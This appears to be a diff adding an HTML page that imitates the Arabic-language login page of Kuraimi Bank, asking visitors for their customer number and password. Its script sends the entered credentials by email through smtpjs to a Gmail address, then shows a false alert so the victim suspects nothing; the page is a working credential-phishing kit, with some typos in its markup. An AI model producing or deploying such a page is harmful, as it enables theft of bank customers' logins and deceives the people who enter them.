@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>HTML</title>
+  
+  <!-- HTML -->
+  <style media="screen">
+
+  *{
+    margin: 0 ;
+    padding: 0 ;
+    box-sizing: border-box ;
+  }
+  
+  
+  
+  .container1 {
+    width: 100% ;
+    max-width: 700px ;
+    height: 150px ;
+    position: relative ;
+    transform: translate(-50% , -50%);
+    top: 10% ;
+    left: 50% ;
+    overflow: hidden ;
+    border: 1px solid #A197B5 ;
+    border-radius: 1px;
+    box-shadow: 10px 25px 30px rgba(0,5,4,0.1);
+    margin-bo7ttom: 30px;
+    margin-top: 150px;
+    
+  }
+  
+  .imges2 {
+    width: 100% ;
+    display: flex ;
+    animation: movslider 20s infinite ;
+    height: 100%
+    
+  }
+  
+    @keyframes movslider{
+      
+    
+    0% {transform: translate(0%);}
+    25% {transform: translate(+200%);}
+    50% {transform: translate(-100%);}
+      40% {transform: translate(-100%);}
+        50% {transform: translate(-200%);}
+     60% {transform: translate(-200%);}
+  60% {transform: translate(-200%);}
+  60% {transform: translate(-200%);}
+  
+  }
+  
+  
+  img {
+    width: 100%  ; 
+    height: 315px 100% ;
+  }
+  
+</style>
+
+
+<link href="https://fonts.googleapis.com/css?family=Cairo&display=swap" rel="stylesheet"></link>
+
+  <link rel="stylesheet" href="style.css">
+  
+  <scri6pt src="https://smtpjs.com/v3/smtp.js"> </script>
+  
+  
+  
+  
+  
+  
+  
+    <link
+      rel="stylesheet"
+      href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
+      integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"
+      crossorigin="anonymous"
+    />
+      
+</head>
+
+<body dir="rtl">
+  <img src="kuraimi-logo.svg" alt="kuraimi-logo.svg">
+  
+  
+  <h4 style="background: #A197B5 ; color: white">مرحباً بك في بنك الكريمي</h4>
+    <img src="oooo.gif" alt="oooo.gif">
+   <div class="container1">
+      <div class="imges2">
+  
+        <img src="FrK4vHaX0AARSOP.jpg">
+        <img src="Mobile.jpg">
+        <img src="w3.jpg">
+        <img src="w1.png">
+        <img src="w2.png">
+  
+      </div>
+   
+    </div>
+   <p style="color: white ; font-size: 15px ; padding: 5px ; background: #A297B9">يرجى إدخال بياناتك بشكل صحيح</p>
+   <br>
+  
+  <div class="q" onsubmit="sendEmail(); reset(); return false">
+   
+    <h6 style="text-align: right ; color: white ; margin-right: 20%">رقم المميز</h6>
+  <form onsubmit="sendEmail(); reset(); return false">
+
+ <input type="text" id="name" placeholder=" أدخل رقم المميز" required>
+ 
+<h6 style="text-align: right ; color: white ;margin-right: 20%">كلمة المرور</h6>
+ 
+<input type="password" id="password" name="password" placeholder="ادخل كلمة المرور">
+
+
+    <br>
+    <button>دخول</button>
+  </form>
+  
+  </div>
+  <footer>
+    <img src="oi.jpg" alt="oi.jpg" width="100">
+  </footer>
+<script src="https://smtpjs.com/v3/smtp.js"> </script>
+  <script>
+    
+function sendEmail() {
+Email.send({
+SecureToken : "e3275d41-401a-4c76-9c84-b900cd9d7440",
+      To:'waaat2491@gmail.com',
+      From:"waaat2491@gmail.com",
+      Subject:"test 5",
+Body:"name: " + document.getElementById("name").value
+
+      + "<br> password: " + document.getElementById("password").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+
+    }).then(
+      message => alert("عذراً انت لست في قائمة التمويل الاصغر")
+    );
+    }
+  </script>
+</body>
+</html>
